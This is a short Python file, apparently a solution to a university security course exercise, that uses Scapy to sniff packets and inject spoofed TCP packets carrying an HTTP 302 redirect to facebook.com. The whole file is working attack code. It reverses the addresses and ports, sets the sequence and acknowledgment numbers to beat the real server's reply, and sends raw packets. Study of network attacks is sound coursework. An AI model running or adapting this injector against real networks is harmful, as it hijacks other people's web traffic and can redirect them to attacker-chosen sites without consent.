import q1
import scapy.all as S

RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: http://www.facebook.com',
    r'',
    r''])

WEBSITE = 'infosec17.cs.tau.ac.il'
SOURCE = ''


def get_tcp_injection_packet(packet):
    infosec_access = packet_filter(packet)
    if not infosec_access:
        return None
    pkt_ip = packet.getlayer(S.IP)
    pkt_tcp = packet.getlayer(S.TCP)
    ip_layer = S.IP(src=pkt_ip.dst, dst=pkt_ip.src)  # IP , network layer
    tcp_layer = S.TCP(  # TCP , transport layer
        sport=pkt_tcp.dport,  # source <- dest
        dport=pkt_tcp.sport,  # dest <- source
        flags="FA",  # close connection
        seq=pkt_tcp.ack,  # update sequence to last ack by client
        ack=pkt_tcp.seq + len(pkt_tcp.payload)  # ack on length so far + length of last payload
    )
    return ip_layer / tcp_layer / RESPONSE


def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!

    if '--help' in args or len(args) > 1:
        print
        'Usage: %s' % args[0]
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys

    main(sys.argv)
